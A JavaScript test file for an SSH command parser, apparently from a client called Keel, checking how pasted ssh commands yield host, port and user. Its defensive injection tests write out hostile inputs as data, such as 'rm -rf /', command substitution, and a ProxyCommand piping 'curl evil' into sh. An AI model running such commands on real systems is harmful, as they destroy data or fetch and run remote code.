import { test } from "node:test";
import assert from "node:assert/strict";
import { describeDropped, parseConnect, validHost, validPort, validUser } from "../lib/sshparse.js";

const ok = (input) => {
  const r = parseConnect(input);
  assert.ok(r && r.ok, `expected ${JSON.stringify(input)} to parse, got ${JSON.stringify(r)}`);
  return r;
};
const refused = (input) => {
  const r = parseConnect(input);
  assert.ok(r === null || r.ok === false, `expected ${JSON.stringify(input)} to be refused, got ${JSON.stringify(r)}`);
  return r;
};
const droppedOptions = (r) => r.dropped.map((d) => d.option);

// ---- what is not a connection ----------------------------------------

test("plain words and empty input are filters, not connections", () => {
  assert.equal(parseConnect(""), null);
  assert.equal(parseConnect("   "), null);
  assert.equal(parseConnect("prod-db"), null);
  assert.equal(parseConnect("prod db 01"), null);
  assert.equal(parseConnect("10.0.4.21"), null);
  assert.equal(parseConnect("host:22"), null);
  assert.equal(parseConnect("sshfs host"), null);
  assert.equal(parseConnect("scp file host:/tmp"), null);
});

// ---- command forms ---------------------------------------------------

test("ssh host", () => {
  const r = ok("ssh prod-db");
  assert.deepEqual([r.source, r.host, r.port, r.user], ["command", "prod-db", 22, ""]);
  assert.deepEqual(r.dropped, []);
  assert.deepEqual(r.notes, []);
});

test("ssh user@host", () => {
  const r = ok("ssh deploy@10.0.4.21");
  assert.deepEqual([r.host, r.port, r.user], ["10.0.4.21", 22, "deploy"]);
});

test("-p port, separate and attached", () => {
  assert.equal(ok("ssh -p 2222 deploy@host").port, 2222);
  assert.equal(ok("ssh -p2222 deploy@host").port, 2222);
  assert.equal(ok("ssh deploy@host -p 2222").port, 2222);
});

test("-l user, and user@ wins over -l", () => {
  assert.equal(ok("ssh -l deploy host").user, "deploy");
  assert.equal(ok("ssh -ldeploy host").user, "deploy");
  assert.equal(ok("ssh -l other deploy@host").user, "deploy");
});

test("-o Port and -o User are used", () => {
  const r = ok("ssh -o Port=2200 -o 'User deploy' host");
  assert.deepEqual([r.port, r.user], [2200, "deploy"]);
  assert.deepEqual(r.dropped, []);
  assert.equal(ok("ssh -oPort=2201 host").port, 2201);
});

test("the destination's own port wins over -p", () => {
  assert.equal(ok("ssh -p 22 ssh://deploy@host:2200").port, 2200);
  assert.equal(ok("ssh -p 22 deploy@host:2200").port, 2200);
});

test("-i is a note and the file is never read", () => {
  const r = ok("ssh -i ~/.ssh/deploy_ed25519 deploy@host");
  assert.equal(r.identityFile, "~/.ssh/deploy_ed25519");
  assert.equal(r.notes.length, 1);
  assert.match(r.notes[0], /not read/);
  assert.match(r.notes[0], /Keychain/);
  assert.deepEqual(r.dropped, []);
  assert.equal(ok("ssh -o IdentityFile=/k/id host").identityFile, "/k/id");
  assert.equal(ok("ssh -i/k/id host").identityFile, "/k/id");
});

test("-J is recorded and shown as not supported yet", () => {
  const r = ok("ssh -J bastion deploy@10.0.4.21 -p 2222");
  assert.deepEqual([r.host, r.port, r.user, r.jump], ["10.0.4.21", 2222, "deploy", "bastion"]);
  assert.equal(r.dropped.length, 1);
  assert.equal(r.dropped[0].option, "-J bastion");
  assert.match(r.dropped[0].reason, /not supported yet/);
  assert.equal(ok("ssh -o ProxyJump=bastion host").jump, "bastion");
});

test("ssh:// URL with user and port", () => {
  const r = ok("ssh://deploy@host.example.com:2222");
  assert.deepEqual([r.source, r.host, r.port, r.user], ["url", "host.example.com", 2222, "deploy"]);
  assert.equal(ok("ssh://host/").host, "host");
  assert.equal(ok("SSH://host").host, "host");
  assert.equal(ok("ssh ssh://deploy@host:2200").port, 2200);
});

test("ssh:// URL with a path is refused", () => {
  assert.equal(refused("ssh://host/etc/passwd").ok, false);
});

test("IPv6 with brackets and a port", () => {
  const r = ok("deploy@[::1]:2222");
  assert.deepEqual([r.host, r.port, r.user], ["::1", 2222, "deploy"]);
  assert.deepEqual([ok("ssh [::1]:22").host, ok("ssh [::1]:22").port], ["::1", 22]);
  assert.equal(ok("ssh [2001:db8::5]").host, "2001:db8::5");
  assert.equal(ok("ssh://deploy@[fe80::1]:2200").host, "fe80::1");
});

test("IPv6 bare in a command", () => {
  const r = ok("ssh -p 2200 2001:db8::5");
  assert.deepEqual([r.host, r.port], ["2001:db8::5", 2200]);
  assert.equal(ok("ssh root@::1").host, "::1");
});

test("IPv6 brackets must hold an IPv6 address and close", () => {
  assert.equal(refused("ssh [host]:22").ok, false);
  assert.equal(refused("ssh [::1").ok, false);
  assert.equal(refused("ssh [::1]x").ok, false);
  assert.equal(refused("ssh [::1]:99999").ok, false);
});

test("user@host:port without ssh", () => {
  const r = ok("deploy@10.0.4.21:2222");
  assert.deepEqual([r.source, r.host, r.port, r.user], ["target", "10.0.4.21", 2222, "deploy"]);
  assert.equal(ok("deploy@host").port, 22);
});

test("extra whitespace, tabs, quotes and a leading prompt", () => {
  assert.equal(ok("  ssh    deploy@host   -p   2222  ").port, 2222);
  assert.equal(ok("ssh\tdeploy@host").host, "host");
  assert.equal(ok("$ ssh deploy@host").host, "host");
  assert.equal(ok("  $   ssh -p 2200 host\n").port, 2200);
  assert.equal(ok("ssh 'deploy@host'").user, "deploy");
  assert.equal(ok('ssh "deploy@host" -p "2222"').port, 2222);
  assert.equal(ok("ssh -p 2222 \\\n  deploy@host").host, "host");
  assert.equal(ok("/usr/bin/ssh host").host, "host");
  assert.equal(ok("ssh host").host, "host");
});

test("short option clusters and the -- separator", () => {
  const r = ok("ssh -vvv -4tt host");
  assert.equal(r.host, "host");
  assert.deepEqual(droppedOptions(r).filter((o) => o === "-v"), ["-v", "-v", "-v"]);
  assert.equal(ok("ssh -p 22 -- host").host, "host");
  assert.equal(refused("ssh -- -weird").ok, false);
});

test("an option's value is taken as a value, then validated", () => {
  assert.equal(refused("ssh -l -x host").ok, false);
  assert.equal(refused("ssh -p -x host").ok, false);
});

// ---- dropped options -------------------------------------------------

test("-o ProxyCommand is dropped with a reason", () => {
  const r = ok("ssh -o ProxyCommand='nc bastion 22' host");
  assert.equal(r.host, "host");
  assert.deepEqual(droppedOptions(r), ["-o ProxyCommand=nc bastion 22"]);
  assert.equal(r.dropped[0].reason, "runs a command");
  assert.equal(r.jump, "");
});

test("-o LocalCommand and PermitLocalCommand are dropped", () => {
  const r = ok("ssh -o PermitLocalCommand=yes -o LocalCommand=./x.sh host");
  assert.deepEqual(droppedOptions(r), ["-o PermitLocalCommand=yes", "-o LocalCommand=./x.sh"]);
  assert.ok(r.dropped.every((d) => d.reason === "runs a command"));
});

test("-o RemoteCommand and KnownHostsCommand are dropped", () => {
  const r = ok("ssh -o RemoteCommand=ls -o KnownHostsCommand=/x host");
  assert.equal(r.dropped.length, 2);
  assert.ok(r.dropped.every((d) => d.reason === "runs a command"));
});

test("-o StrictHostKeyChecking=no and known-hosts changes are dropped", () => {
  const r = ok("ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null host");
  assert.deepEqual(droppedOptions(r), ["-o StrictHostKeyChecking=no", "-o UserKnownHostsFile=/dev/null"]);
  assert.ok(r.dropped.every((d) => d.reason === "changes host key trust"));
  assert.equal(ok("ssh -oStrictHostKeyChecking=accept-new host").dropped.length, 1);
  assert.equal(ok("ssh -o 'StrictHostKeyChecking no' host").dropped[0].option, "-o StrictHostKeyChecking=no");
});

test("option keys match without regard to case", () => {
  const r = ok("ssh -o proxycommand=x -o STRICTHOSTKEYCHECKING=no host");
  assert.equal(r.dropped.length, 2);
});

test("-L, -R, -D forwards are dropped", () => {
  const r = ok("ssh -L 8080:localhost:80 -R 9000:localhost:9000 -D 1080 host");
  assert.deepEqual(droppedOptions(r), ["-L 8080:localhost:80", "-R 9000:localhost:9000", "-D 1080"]);
  assert.ok(r.dropped.every((d) => /port forward/.test(d.reason)));
  assert.equal(ok("ssh -L8080:localhost:80 host").dropped[0].option, "-L 8080:localhost:80");
  assert.equal(ok("ssh -o LocalForward=8080:x:80 host").dropped.length, 1);
});

test("-W is dropped", () => {
  const r = ok("ssh -W target:22 host");
  assert.equal(r.host, "host");
  assert.deepEqual(droppedOptions(r), ["-W target:22"]);
});

test("a trailing remote command is dropped, never run", () => {
  const r = ok("ssh deploy@host 'rm -rf /tmp/x'");
  assert.deepEqual([r.host, r.user], ["host", "deploy"]);
  assert.deepEqual(droppedOptions(r), ["rm -rf /tmp/x"]);
  assert.match(r.dropped[0].reason, /remote command/);
  const r2 = ok("ssh -t host sudo systemctl restart nginx");
  assert.deepEqual(droppedOptions(r2), ["-t", "sudo systemctl restart nginx"]);
  // Options after the command start belong to the command.
  assert.equal(ok("ssh host ls -p 99").port, 22);
});

test("agent and X11 forwarding, config files and sockets are dropped", () => {
  const r = ok("ssh -A -X -F ./cfg -S /tmp/sock host");
  assert.equal(r.dropped.length, 4);
  assert.equal(ok("ssh -o ForwardAgent=yes host").dropped[0].reason, "forwards your agent");
  assert.equal(ok("ssh -o Include=/etc/x host").dropped[0].reason, "reads another config file");
});

test("unknown -o keys are dropped as not part of the host model", () => {
  const r = ok("ssh -o ServerAliveInterval=30 host");
  assert.equal(r.dropped[0].reason, "not part of the host model");
});

test("-o HostName cannot replace the host", () => {
  const r = ok("ssh -o HostName=evil.example host");
  assert.equal(r.host, "host");
  assert.equal(r.dropped[0].reason, "replaces the host");
});

test("describeDropped lists each entry on a line", () => {
  const r = ok("ssh -J b -L 1:x:2 host ls");
  assert.deepEqual(describeDropped(r.dropped), [
    "-L 1:x:2: opens a port forward; add it in Forwards",
    "ls: remote command; Keel opens a shell and does not run it",
    "-J b: jump hosts are not supported yet",
  ]);
  assert.deepEqual(describeDropped(), []);
});

test("long dropped text is clipped", () => {
  const r = ok(`ssh host ${"x".repeat(500)}`);
  assert.ok(r.dropped[0].option.length <= 80);
});

// ---- junk and injection ----------------------------------------------

test("shell operators yield no host", () => {
  for (const input of [
    "ssh host; rm -rf /",
    "ssh host;ls",
    "ssh host && id",
    "ssh host || id",
    "ssh host | sh",
    "ssh host & id",
    "ssh host > /etc/passwd",
    "ssh host < /etc/passwd",
    "ssh (host)",
    "ssh host;",
  ]) {
    const r = refused(input);
    assert.equal(r.ok, false, input);
    assert.equal(r.source, "command");
    assert.equal(r.host, undefined);
  }
});

test("command substitution and backticks yield no host", () => {
  for (const input of [
    "ssh $(id)",
    "ssh host$(id)",
    "ssh `id`",
    "ssh host`id`",
    'ssh "$(id)"',
    'ssh "`id`"',
    "ssh ${HOME}",
    "ssh -o ProxyCommand=$(id) host",
    "ssh -p $(id) host",
    "deploy@$(id)",
    "ssh://$(id)@host",
    "ssh://host`id`",
  ]) {
    assert.equal(refused(input).ok, false, input);
  }
});

test("newlines inside the text yield no host", () => {
  for (const input of ["ssh host\nrm -rf /", "ssh host\r\nid", "ssh host\n\nssh other", "ssh://host\nid"]) {
    assert.equal(refused(input).ok, false, JSON.stringify(input));
  }
  // user@host plus a second line is not read as a target at all.
  assert.equal(parseConnect("deploy@host\nid"), null);
  // A single trailing newline is only whitespace.
  assert.equal(ok("ssh host\n").host, "host");
});

test("characters that are not valid in a host or user are rejected", () => {
  for (const input of [
    "ssh 'ho st'",
    "ssh 'host;id'",
    "ssh 'host|id'",
    "ssh 'ho$st'",
    "ssh host\\;id",
    "ssh -oProxyCommand host\\;id",
    "ssh 'a b@host'",
    "ssh 'de;ploy@host'",
    "ssh 'user$@host'",
    "ssh deploy@host:22:22x",
    "ssh deploy@host:abc",
    "ssh deploy@host:0",
    "ssh deploy@host:65536",
    "ssh -p 70000 host",
    "ssh -p abc host",
    "ssh -p '' host",
    "ssh -p -1 host",
    "ssh @host",
    "ssh user@",
    "ssh -l 'a;b' host",
    "ssh host.",
    "ssh -.example",
    "ssh .example",
    "ssh a..b",
    "ssh ex%ample",
    "ssh ex/ample",
    "ssh ex\\ ample",
  ]) {
    assert.equal(refused(input).ok, false, input);
  }
});

test("a host that starts with - is an option, never a host", () => {
  assert.equal(refused("ssh -oProxyCommand=id").ok, false);
  assert.equal(refused("ssh -- -oProxyCommand=id").ok, false);
  assert.equal(refused("ssh -").ok, false);
  assert.equal(refused("ssh").ok, false);
  assert.equal(refused("ssh -p").ok, false);
  assert.equal(refused("ssh -Z host").ok, false);
});

test("unbalanced quotes and trailing backslashes are refused", () => {
  assert.equal(refused("ssh 'host").ok, false);
  assert.equal(refused('ssh "host').ok, false);
  assert.equal(refused("ssh host\\").ok, false);
});

test("control characters and oversize input are refused", () => {
  assert.equal(refused("ssh ho\u0000st").ok, false);
  assert.equal(refused("ssh ho\u001bst").ok, false);
  assert.equal(refused(`ssh ${"a".repeat(3000)}`).ok, false);
});

test("a refused command carries an error and nothing to connect to", () => {
  const r = parseConnect("ssh host; id");
  assert.equal(typeof r.error, "string");
  assert.ok(r.error.length > 0);
  assert.equal("host" in r, false);
  assert.equal("port" in r, false);
});

test("dropped text is data: it stays out of the host fields", () => {
  const r = ok("ssh -o 'ProxyCommand=curl evil|sh' host");
  assert.equal(r.host, "host");
  assert.equal(r.user, "");
  assert.equal(JSON.stringify([r.host, r.user, r.identityFile, r.jump]).includes("evil"), false);
});

// ---- validators ------------------------------------------------------

test("validHost", () => {
  for (const h of ["host", "a.b-c.example", "10.0.4.21", "::1", "2001:db8::5", "fe80::1", "a_b.example", "H1"]) {
    assert.ok(validHost(h), h);
  }
  for (const h of ["", "-host", "host-", "ho st", "host;", ":::", "1:2:3:4:5:6:7:8:9", "a".repeat(254), `${"a".repeat(64)}.com`, "host:22", "g:z"]) {
    assert.ok(!validHost(h), h);
  }
});

test("validPort", () => {
  for (const p of ["1", "22", "65535", 2222]) assert.ok(validPort(p), String(p));
  for (const p of ["", "0", "65536", "-1", "1e3", "22.5", " 22", "0x16", "123456", null, undefined]) assert.ok(!validPort(p), String(p));
});

test("validUser", () => {
  for (const u of ["root", "deploy", "a.b-c_d", "_svc", "User1"]) assert.ok(validUser(u), u);
  for (const u of ["", "a b", "a;b", "a@b", "-x", "a$b", "a".repeat(65)]) assert.ok(!validUser(u), u);
});
